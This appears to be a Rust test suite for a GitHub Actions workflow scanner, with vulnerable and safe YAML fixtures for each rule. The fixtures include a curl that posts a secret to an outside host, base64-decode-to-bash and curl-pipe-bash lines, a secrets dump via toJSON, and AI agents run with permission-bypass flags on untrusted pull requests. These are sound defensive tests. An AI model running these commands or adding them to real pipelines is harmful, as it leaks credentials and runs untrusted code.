use wardenscan::expression::ExprIndex;
use wardenscan::ignores::IgnoreMap;
use wardenscan::rules::{AuditCtx, Rule, RuleFinding};
use wardenscan::scanner::{load_one, stub_workflow, LoadedFile};
use wardenscan::shell::ShellIndex;
use wardenscan::taint;

fn audit_with(rule: &dyn Rule, yaml: &str) -> Vec<RuleFinding> {
    audit_with_path(rule, "test.yml", yaml)
}

fn audit_with_path(rule: &dyn Rule, path: &str, yaml: &str) -> Vec<RuleFinding> {
    let loaded_file = load_one(std::path::PathBuf::from(path), yaml.to_string()).expect("load");
    let loaded_wf = match loaded_file {
        LoadedFile::Workflow(w) => *w,
        LoadedFile::Other {
            path, raw, spans, ..
        } => stub_workflow(path, raw, spans),
    };
    let exprs = ExprIndex::build(&loaded_wf.workflow);
    let shell = ShellIndex::build(&loaded_wf.workflow);
    let ignores = IgnoreMap::new();
    let provenance = taint::build_provenance(&loaded_wf.workflow);
    let ctx = AuditCtx {
        loaded: &loaded_wf,
        expressions: &exprs,
        shell: &shell,
        ignores: &ignores,
        provenance: &provenance,
    };
    rule.audit(&ctx)
}

use wardenscan::rules::*;

// ---------------------------------------------------------------------------
// WRD-440: Secret in Run Block
// ---------------------------------------------------------------------------

#[test]
fn test_wrd440_secret_in_run_vulnerable() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ secrets.MY_TOKEN }}"
"#;
    let findings = audit_with(&wrd440::Wrd440, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect secret interpolation inside run: block"
    );
    assert_eq!(findings[0].rule_id, "WRD-440");
}

#[test]
fn test_wrd440_secret_in_run_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "$TOKEN"
        env:
          TOKEN: ${{ secrets.MY_TOKEN }}
"#;
    let findings = audit_with(&wrd440::Wrd440, yaml);
    assert!(
        findings.is_empty(),
        "Should not fire when the secret is supplied via env:"
    );
}

// ---------------------------------------------------------------------------
// WRD-421: Network Exfiltration
// ---------------------------------------------------------------------------

#[test]
fn test_wrd421_network_exfil_vulnerable() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -X POST -d "${{ secrets.MY_TOKEN }}" https://example.com
"#;
    let findings = audit_with(&wrd421::Wrd421, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect curl sending a secret payload"
    );
    assert_eq!(findings[0].rule_id, "WRD-421");
}

#[test]
fn test_wrd421_network_exfil_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -sSfL https://example.com/index.html -o index.html
"#;
    let findings = audit_with(&wrd421::Wrd421, yaml);
    assert!(
        findings.is_empty(),
        "Should not fire when the curl command does not reference a secret"
    );
}

// ---------------------------------------------------------------------------
// WRD-422: Debug Logging Enabled
// ---------------------------------------------------------------------------

#[test]
fn test_wrd422_debug_logging_vulnerable() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      ACTIONS_STEP_DEBUG: "true"
    steps:
      - run: echo "hello"
"#;
    let findings = audit_with(&wrd422::Wrd422, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect ACTIONS_STEP_DEBUG=true at job scope"
    );
    assert_eq!(findings[0].rule_id, "WRD-422");
}

#[test]
fn test_wrd422_debug_logging_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "hello"
"#;
    let findings = audit_with(&wrd422::Wrd422, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag a workflow without debug envs"
    );
}

// ---------------------------------------------------------------------------
// WRD-424: Secrets Used Outside Environment Scope
// ---------------------------------------------------------------------------

#[test]
fn test_wrd424_secrets_without_environment_vulnerable() {
    let yaml = r#"
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
        env:
          API_KEY: ${{ secrets.PROD_API_KEY }}
"#;
    let findings = audit_with(&wrd424::Wrd424, yaml);
    assert!(
        !findings.is_empty(),
        "Should flag a job that references secrets but has no environment:"
    );
    assert_eq!(findings[0].rule_id, "WRD-424");
}

#[test]
fn test_wrd424_secrets_without_environment_safe() {
    let yaml = r#"
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - run: ./deploy.sh
        env:
          API_KEY: ${{ secrets.PROD_API_KEY }}
"#;
    let findings = audit_with(&wrd424::Wrd424, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag when the job declares an environment"
    );
}

// ---------------------------------------------------------------------------
// WRD-510: AI Config Poisoning
// ---------------------------------------------------------------------------

#[test]
fn test_wrd510_ai_config_poisoning_vulnerable() {
    let yaml = r#"
name: AI Review
on: pull_request_target
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: claude-code review .
"#;
    let findings = audit_with(&wrd510::Wrd510, yaml);
    assert!(
        !findings.is_empty(),
        "Should fire on privileged trigger + fork checkout + AI tool"
    );
    assert_eq!(findings[0].rule_id, "WRD-510");
}

#[test]
fn test_wrd510_ai_config_poisoning_safe() {
    let yaml = r#"
name: AI Review
on: pull_request_target
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: claude-code post-comment "Hi"
"#;
    let findings = audit_with(&wrd510::Wrd510, yaml);
    assert!(
        findings.is_empty(),
        "Should not fire when there is no fork checkout"
    );
}

// ---------------------------------------------------------------------------
// WRD-511: MCP Config Injection
// ---------------------------------------------------------------------------

#[test]
fn test_wrd511_mcp_injection_vulnerable() {
    let yaml = r#"
name: AI Review
on: pull_request_target
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: cat .mcp.json
"#;
    let findings = audit_with(&wrd511::Wrd511, yaml);
    assert!(
        !findings.is_empty(),
        "Should fire on privileged trigger + fork checkout + MCP config path"
    );
    assert_eq!(findings[0].rule_id, "WRD-511");
}

#[test]
fn test_wrd511_mcp_injection_safe() {
    let yaml = r#"
name: PR Build
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm run build
"#;
    let findings = audit_with(&wrd511::Wrd511, yaml);
    assert!(
        findings.is_empty(),
        "Should not fire when the workflow does not mention MCP config"
    );
}

// ---------------------------------------------------------------------------
// WRD-540: Dependabot Cooldown
// ---------------------------------------------------------------------------

#[test]
fn test_wrd540_dependabot_daily_without_groups_vulnerable() {
    let yaml = r#"
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: daily
"#;
    let findings = audit_with_path(&wrd540::Wrd540, ".github/dependabot.yml", yaml);
    assert!(
        !findings.is_empty(),
        "Should flag a daily schedule with no groups: key"
    );
    assert_eq!(findings[0].rule_id, "WRD-540");
}

#[test]
fn test_wrd540_dependabot_daily_without_groups_safe() {
    let yaml = r#"
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: daily
    groups:
      production-dependencies:
        patterns:
          - "*"
"#;
    let findings = audit_with_path(&wrd540::Wrd540, ".github/dependabot.yml", yaml);
    assert!(
        findings.is_empty(),
        "Should not fire when the config has a groups: key"
    );
}

// ---------------------------------------------------------------------------
// WRD-521: Dependabot Insecure Execution
// ---------------------------------------------------------------------------

#[test]
fn test_wrd521_dependabot_insecure_exec_vulnerable() {
    let yaml = r#"
name: Dependabot Auto Merge
on:
  pull_request_target:
    branches: [main]
jobs:
  merge:
    if: github.actor == 'dependabot[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install
"#;
    let findings = audit_with_path(&wrd521::Wrd521, ".github/workflows/dependabot.yml", yaml);
    assert!(
        !findings.is_empty(),
        "Should flag pull_request_target + dependabot actor + PR head checkout + script run"
    );
    assert_eq!(findings[0].rule_id, "WRD-521");
}

#[test]
fn test_wrd521_dependabot_insecure_exec_safe() {
    let yaml = r#"
name: Dependabot Auto Merge
on:
  pull_request:
    branches: [main]
jobs:
  merge:
    if: github.actor == 'dependabot[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm install
"#;
    let findings = audit_with_path(&wrd521::Wrd521, ".github/workflows/dependabot.yml", yaml);
    assert!(
        findings.is_empty(),
        "Should not fire when trigger is plain pull_request (no pull_request_target)"
    );
}

// ---------------------------------------------------------------------------
// WRD-525: Use Trusted Publishing
// ---------------------------------------------------------------------------

#[test]
fn test_wrd525_pypi_token_vulnerable() {
    let yaml = r#"
name: Publish
on: push
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - run: twine upload dist/*
        env:
          TWINE_PASSWORD: ${{ secrets.PYPI_API_TOKEN }}
"#;
    let findings = audit_with(&wrd525::Wrd525, yaml);
    assert!(
        !findings.is_empty(),
        "Should flag the PYPI_API_TOKEN secret reference"
    );
    assert_eq!(findings[0].rule_id, "WRD-525");
}

#[test]
fn test_wrd525_pypi_trusted_publishing_safe() {
    let yaml = r#"
name: Publish
on: push
permissions:
  id-token: write
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: pypa/gh-action-pypi-publish@release/v1
"#;
    let findings = audit_with(&wrd525::Wrd525, yaml);
    assert!(
        findings.is_empty(),
        "Should not fire when using pypa action with id-token: write (trusted publishing)"
    );
}

// ---------------------------------------------------------------------------
// WRD-715: Debug Artifact Env Exposure (renumbered from WRD-731, CodeQLEAKED class, CVE-2025-24362)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd715_workflow_env_debug_with_upload_fires() {
    let yaml = r#"
name: t
on: push
env:
  ACTIONS_STEP_DEBUG: true
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
      - uses: actions/upload-artifact@v4
        with:
          path: .
"#;
    let findings = audit_with(&wrd715::Wrd715, yaml);
    assert!(
        !findings.is_empty(),
        "workflow-level ACTIONS_STEP_DEBUG + upload-artifact should fire"
    );
    assert_eq!(findings[0].rule_id, "WRD-715");
    assert_eq!(findings[0].severity, wardenscan::rules::Severity::High);
}

#[test]
fn test_wrd715_runner_debug_step_env_fires() {
    let yaml = r#"
name: t
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: something
        env:
          ACTIONS_RUNNER_DEBUG: true
      - uses: actions/upload-artifact@v4
        with:
          path: out/
"#;
    let findings = audit_with(&wrd715::Wrd715, yaml);
    assert!(
        findings
            .iter()
            .any(|f| f.title.contains("ACTIONS_RUNNER_DEBUG")),
        "step-level ACTIONS_RUNNER_DEBUG + upload-artifact should fire"
    );
}

#[test]
fn test_wrd715_debug_without_upload_safe() {
    let yaml = r#"
name: t
on: push
env:
  ACTIONS_STEP_DEBUG: true
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
"#;
    let findings = audit_with(&wrd715::Wrd715, yaml);
    assert!(
        findings.is_empty(),
        "debug flag without upload-artifact should NOT fire"
    );
}

#[test]
fn test_wrd715_upload_without_debug_safe() {
    let yaml = r#"
name: t
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
      - uses: actions/upload-artifact@v4
        with:
          path: .
"#;
    let findings = audit_with(&wrd715::Wrd715, yaml);
    assert!(
        findings.is_empty(),
        "upload-artifact without debug flag should NOT fire"
    );
}

// ---------------------------------------------------------------------------
// WRD-527: Registry Publish Without Trusted Publishing (Cargo + RubyGems)
// ---------------------------------------------------------------------------

#[test]
#[cfg(feature = "shell-analysis")]
fn test_wrd527_cargo_publish_run_block_vulnerable() {
    let yaml = r#"
name: release
on: push
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - run: cargo publish --token $TOKEN
        env:
          TOKEN: ${{ secrets.CARGO_REGISTRY_TOKEN }}
"#;
    let findings = audit_with(&wrd527::Wrd527, yaml);
    assert!(
        findings.iter().any(|f| f.title.contains("cargo publish")),
        "cargo publish in run block should fire WRD-527"
    );
}

#[test]
fn test_wrd527_cargo_registry_token_secret_vulnerable() {
    let yaml = r#"
name: release
on: push
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
        env:
          CARGO_REGISTRY_TOKEN: ${{ secrets.CARGO_REGISTRY_TOKEN }}
"#;
    let findings = audit_with(&wrd527::Wrd527, yaml);
    assert!(
        findings.iter().any(|f| f.title.contains("Cargo")),
        "CARGO_REGISTRY_TOKEN secret reference should fire WRD-527"
    );
}

#[test]
#[cfg(feature = "shell-analysis")]
fn test_wrd527_gem_push_run_block_vulnerable() {
    let yaml = r#"
name: gem
on: push
jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - run: gem push foo.gem
        env:
          GEM_HOST_API_KEY: ${{ secrets.GEM_HOST_API_KEY }}
"#;
    let findings = audit_with(&wrd527::Wrd527, yaml);
    assert!(
        findings.iter().any(|f| f.title.contains("gem push")),
        "gem push in run block should fire WRD-527"
    );
}

#[test]
fn test_wrd527_unrelated_secret_safe() {
    let yaml = r#"
name: safe
on: push
jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
        env:
          SOME_UNRELATED_TOKEN: ${{ secrets.SOME_UNRELATED_TOKEN }}
"#;
    let findings = audit_with(&wrd527::Wrd527, yaml);
    assert!(
        findings.is_empty(),
        "unrelated secret should NOT fire WRD-527; got {} finding(s)",
        findings.len()
    );
}

// ---------------------------------------------------------------------------
// WRD-522: AI Agent Permission Bypass Flags (renumbered from WRD-512, Nx s1ngularity class)
// ---------------------------------------------------------------------------

#[test]
#[cfg(feature = "shell-analysis")]
fn test_wrd522_claude_dangerous_flag_on_pr_target_high() {
    let yaml = r#"
name: ai
on: pull_request_target
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - run: |
          claude --dangerously-skip-permissions --prompt "$PROMPT"
"#;
    let findings = audit_with(&wrd522::Wrd522, yaml);
    assert!(
        findings
            .iter()
            .any(|f| f.severity == wardenscan::rules::Severity::High),
        "claude --dangerously-skip-permissions on pull_request_target should be HIGH"
    );
}

#[test]
#[cfg(feature = "shell-analysis")]
fn test_wrd522_gemini_yolo_on_push_medium() {
    let yaml = r#"
name: g
on: push
jobs:
  r:
    runs-on: ubuntu-latest
    steps:
      - run: gemini --yolo "auto-fix the codebase"
"#;
    let findings = audit_with(&wrd522::Wrd522, yaml);
    assert!(
        findings
            .iter()
            .any(|f| f.severity == wardenscan::rules::Severity::Medium),
        "gemini --yolo on push should be MEDIUM"
    );
}

#[test]
#[cfg(feature = "shell-analysis")]
fn test_wrd522_claude_with_prompt_only_safe() {
    let yaml = r#"
name: safe
on: push
jobs:
  r:
    runs-on: ubuntu-latest
    steps:
      - run: |
          claude --prompt "just a summary"
"#;
    let findings = audit_with(&wrd522::Wrd522, yaml);
    assert!(
        findings.is_empty(),
        "claude without a bypass flag should NOT fire; got {}",
        findings.len()
    );
}

#[test]
#[cfg(feature = "shell-analysis")]
fn test_wrd522_cursor_trust_all_tools() {
    let yaml = r#"
name: c
on: workflow_run
jobs:
  r:
    runs-on: ubuntu-latest
    steps:
      - run: cursor-agent --trust-all-tools --task "refactor"
"#;
    let findings = audit_with(&wrd522::Wrd522, yaml);
    assert!(
        findings
            .iter()
            .any(|f| f.severity == wardenscan::rules::Severity::High),
        "cursor-agent --trust-all-tools on workflow_run should be HIGH"
    );
}

// ---------------------------------------------------------------------------
// WRD-526: GitHub App Token Misuse
// ---------------------------------------------------------------------------

#[test]
fn test_wrd526_skip_token_revoke_vulnerable() {
    let yaml = r#"
name: t
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/create-github-app-token@v1
        with:
          app-id: ${{ vars.APP_ID }}
          private-key: ${{ secrets.APP_KEY }}
          repositories: this-repo
          permissions: |
            contents: read
          skip-token-revoke: true
"#;
    let findings = audit_with(&wrd526::Wrd526, yaml);
    assert!(
        findings
            .iter()
            .any(|f| f.severity == wardenscan::rules::Severity::High
                && f.title.contains("revocation disabled")),
        "skip-token-revoke: true should emit a HIGH finding"
    );
}

#[test]
fn test_wrd526_missing_repositories_vulnerable() {
    let yaml = r#"
name: t
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/create-github-app-token@v1
        with:
          app-id: ${{ vars.APP_ID }}
          private-key: ${{ secrets.APP_KEY }}
          permissions: |
            contents: read
"#;
    let findings = audit_with(&wrd526::Wrd526, yaml);
    assert!(
        findings
            .iter()
            .any(|f| f.title.contains("scoped to all installation repos")),
        "missing repositories: should flag over-broad repo scope"
    );
}

#[test]
fn test_wrd526_missing_permissions_vulnerable() {
    let yaml = r#"
name: t
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/create-github-app-token@v1
        with:
          app-id: ${{ vars.APP_ID }}
          private-key: ${{ secrets.APP_KEY }}
          repositories: this-repo
"#;
    let findings = audit_with(&wrd526::Wrd526, yaml);
    assert!(
        findings
            .iter()
            .any(|f| f.title.contains("inherits all installation permissions")),
        "missing permissions: should flag over-broad permission inheritance"
    );
}

#[test]
fn test_wrd526_minimal_scoped_safe() {
    let yaml = r#"
name: t
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/create-github-app-token@v1
        with:
          app-id: ${{ vars.APP_ID }}
          private-key: ${{ secrets.APP_KEY }}
          repositories: this-repo
          permissions: |
            contents: read
"#;
    let findings = audit_with(&wrd526::Wrd526, yaml);
    assert!(
        findings.is_empty(),
        "scoped token with revoke-on-exit should not fire, {} finding(s)",
        findings.len()
    );
}

// ---------------------------------------------------------------------------
// WRD-621: Unicode Steganography
// ---------------------------------------------------------------------------

#[test]
fn test_wrd621_unicode_steg_vulnerable() {
    let yaml = "name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"hi\u{200B}there\"\n";
    let findings = audit_with(&wrd621::Wrd621, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect a zero-width space in the workflow"
    );
    assert_eq!(findings[0].rule_id, "WRD-621");
}

#[test]
fn test_wrd621_unicode_steg_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "plain ascii"
"#;
    let findings = audit_with(&wrd621::Wrd621, yaml);
    assert!(
        findings.is_empty(),
        "Should not fire on a plain ASCII workflow"
    );
}

// ---------------------------------------------------------------------------
// WRD-602: Indicator of Compromise
// ---------------------------------------------------------------------------

#[test]
fn test_wrd602_ioc_vulnerable() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "ZXZhbCQoYmFzZTY0IC1kKQ==" | base64 -d | bash
"#;
    let findings = audit_with(&wrd602::Wrd602, yaml);
    assert!(!findings.is_empty(), "Should flag base64 -d decode pattern");
    assert_eq!(findings[0].rule_id, "WRD-602");
}

#[test]
fn test_wrd602_ioc_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "hello world"
"#;
    let findings = audit_with(&wrd602::Wrd602, yaml);
    assert!(
        findings.is_empty(),
        "Should not fire on a benign echo command"
    );
}

// ---------------------------------------------------------------------------
// WRD-701: toJSON(secrets) Exposure
// ---------------------------------------------------------------------------

#[test]
fn test_wrd701_tojson_secrets_vulnerable() {
    let yaml = r#"
name: Debug
on: push
jobs:
  debug:
    runs-on: ubuntu-latest
    steps:
      - run: echo '${{ toJSON(secrets) }}'
"#;
    let findings = audit_with(&wrd701::Wrd701, yaml);
    assert!(
        !findings.is_empty(),
        "Should flag toJSON(secrets) serialization"
    );
    assert_eq!(findings[0].rule_id, "WRD-701");
}

#[test]
fn test_wrd701_tojson_secrets_safe() {
    let yaml = r#"
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ secrets.MY_TOKEN }}"
"#;
    let findings = audit_with(&wrd701::Wrd701, yaml);
    assert!(
        findings.is_empty(),
        "Should not fire on a single named secret reference"
    );
}

// ---------------------------------------------------------------------------
// WRD-730: Artipacked
// ---------------------------------------------------------------------------

#[test]
fn test_wrd730_artipacked_vulnerable() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@abcdef1234567890abcdef1234567890abcdef12
      - run: make build
"#;
    let findings = audit_with(&wrd730::Wrd730, yaml);
    assert!(
        !findings.is_empty(),
        "Should flag checkout without persist-credentials: false"
    );
    assert_eq!(findings[0].rule_id, "WRD-730");
}

#[test]
fn test_wrd730_docker_build_push_sink_high() {
    // Regression: docker/build-push-action copies .git/ into its build context
    // by default. With a pre-v6 checkout that persists credentials, the token
    // ends up in the published image layer. Must fire HIGH, not just LOW.
    let yaml = r#"
name: t
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: docker/build-push-action@v5
        with:
          push: true
"#;
    let findings = audit_with(&wrd730::Wrd730, yaml);
    assert!(
        findings
            .iter()
            .any(|f| f.severity == wardenscan::rules::Severity::High),
        "docker/build-push-action + pre-v6 checkout should be HIGH"
    );
}

#[test]
fn test_wrd730_gh_release_sink_high() {
    let yaml = r#"
name: t
on: push
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - uses: softprops/action-gh-release@v2
        with:
          files: workspace.tgz
"#;
    let findings = audit_with(&wrd730::Wrd730, yaml);
    assert!(
        findings
            .iter()
            .any(|f| f.severity == wardenscan::rules::Severity::High),
        "softprops/action-gh-release + pre-v6 checkout should be HIGH"
    );
}

#[test]
fn test_wrd730_pre_v6_no_sink_medium() {
    // Pre-v6 checkout with no upload/release/docker sink today is still
    // a latent leak (the token sits in the workspace .git/config). Bumped
    // from LOW to MEDIUM per the 2026 incident-history audit after
    // repeated real-world disclosures at Red Hat / Google / AWS.
    let yaml = r#"
name: t
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make test
"#;
    let findings = audit_with(&wrd730::Wrd730, yaml);
    assert!(
        findings
            .iter()
            .any(|f| f.severity == wardenscan::rules::Severity::Medium),
        "pre-v6 checkout with no sink should be MEDIUM (latent), not LOW"
    );
}

#[test]
fn test_wrd730_v6_plus_stays_low() {
    // v6+ moved the token out of .git/config to $RUNNER_TEMP, so even with
    // a sink present the active exploit path is gone; keep as LOW
    // hardening guidance.
    let yaml = r#"
name: t
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: actions/upload-artifact@v4
        with:
          path: ./
"#;
    let findings = audit_with(&wrd730::Wrd730, yaml);
    assert!(
        findings
            .iter()
            .all(|f| f.severity == wardenscan::rules::Severity::Low),
        "v6+ should stay LOW regardless of sink presence"
    );
}

#[test]
fn test_wrd730_artipacked_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@abcdef1234567890abcdef1234567890abcdef12
        with:
          persist-credentials: false
      - run: make build
"#;
    let findings = audit_with(&wrd730::Wrd730, yaml);
    assert!(
        findings.is_empty(),
        "Should not fire when persist-credentials: false is set"
    );
}

// ---------------------------------------------------------------------------
// WRD-721: Secrets Inherit
// ---------------------------------------------------------------------------

#[test]
fn test_wrd721_secrets_inherit_vulnerable() {
    let yaml = r#"
name: CI
on: push
jobs:
  call-workflow:
    uses: org/repo/.github/workflows/deploy.yml@main
    secrets: inherit
"#;
    let findings = audit_with(&wrd721::Wrd721, yaml);
    assert!(
        !findings.is_empty(),
        "Should flag secrets: inherit on a reusable workflow call"
    );
    assert_eq!(findings[0].rule_id, "WRD-721");
}

#[test]
fn test_wrd721_secrets_inherit_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  call-workflow:
    uses: org/repo/.github/workflows/deploy.yml@main
    secrets:
      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
"#;
    let findings = audit_with(&wrd721::Wrd721, yaml);
    assert!(
        findings.is_empty(),
        "Should not fire when secrets are listed explicitly"
    );
}

// ---------------------------------------------------------------------------
// WRD-712: Insecure Commands
// ---------------------------------------------------------------------------

#[test]
fn test_wrd712_insecure_commands_vulnerable() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      ACTIONS_ALLOW_UNSECURE_COMMANDS: "true"
    steps:
      - run: echo "::set-env name=FOO::bar"
"#;
    let findings = audit_with(&wrd712::Wrd712, yaml);
    assert!(
        !findings.is_empty(),
        "Should flag ACTIONS_ALLOW_UNSECURE_COMMANDS=true"
    );
    assert_eq!(findings[0].rule_id, "WRD-712");
}

#[test]
fn test_wrd712_insecure_commands_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "FOO=bar" >> $GITHUB_ENV
"#;
    let findings = audit_with(&wrd712::Wrd712, yaml);
    assert!(
        findings.is_empty(),
        "Should not fire without the insecure commands env toggle"
    );
}

// ---------------------------------------------------------------------------
// WRD-722: Hardcoded Credentials
// ---------------------------------------------------------------------------

#[test]
fn test_wrd722_hardcoded_credentials_vulnerable() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: my-registry/app:1.0
      credentials:
        username: alice
        password: hunter2
    steps:
      - run: echo hello
"#;
    let findings = audit_with(&wrd722::Wrd722, yaml);
    assert!(
        !findings.is_empty(),
        "Should flag plaintext credentials in a container block"
    );
    assert_eq!(findings[0].rule_id, "WRD-722");
}

#[test]
fn test_wrd722_hardcoded_credentials_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: my-registry/app:1.0
      credentials:
        username: ${{ secrets.REGISTRY_USERNAME }}
        password: ${{ secrets.REGISTRY_PASSWORD }}
    steps:
      - run: echo hello
"#;
    let findings = audit_with(&wrd722::Wrd722, yaml);
    assert!(
        findings.is_empty(),
        "Should not fire when credentials are sourced from secrets"
    );
}

// ---------------------------------------------------------------------------
// WRD-714: Curl Pipe Bash
// ---------------------------------------------------------------------------

#[test]
fn test_wrd714_curl_pipe_bash_vulnerable() {
    let yaml = r#"
name: Setup
on: push
jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://example.com/install.sh | bash
"#;
    let findings = audit_with(&wrd714::Wrd714, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect curl piped directly to bash"
    );
    assert_eq!(findings[0].rule_id, "WRD-714");
}

#[test]
fn test_wrd714_curl_pipe_bash_safe() {
    let yaml = r#"
name: Setup
on: push
jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://example.com/install.sh > /tmp/installer
"#;
    let findings = audit_with(&wrd714::Wrd714, yaml);
    assert!(
        findings.is_empty(),
        "Should not fire when the script is downloaded to a file without execution"
    );
}

// ---------------------------------------------------------------------------
// WRD-723: Unpinned Docker Images
// ---------------------------------------------------------------------------

#[test]
fn test_wrd723_unpinned_docker_vulnerable() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: "alpine:3.19"
    steps:
      - run: echo hello
"#;
    let findings = audit_with(&wrd723::Wrd723, yaml);
    assert!(
        !findings.is_empty(),
        "Should flag a container image pinned only by tag"
    );
    assert_eq!(findings[0].rule_id, "WRD-723");
}

#[test]
fn test_wrd723_unpinned_docker_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: "alpine@sha256:c5b1261d6d3e43071626931fc004f70149baeba2c8ec672bd4f27761f8e1ad6b"
    steps:
      - run: echo hello
"#;
    let findings = audit_with(&wrd723::Wrd723, yaml);
    assert!(
        findings.is_empty(),
        "Should not fire when the image is pinned to a sha256 digest"
    );
}
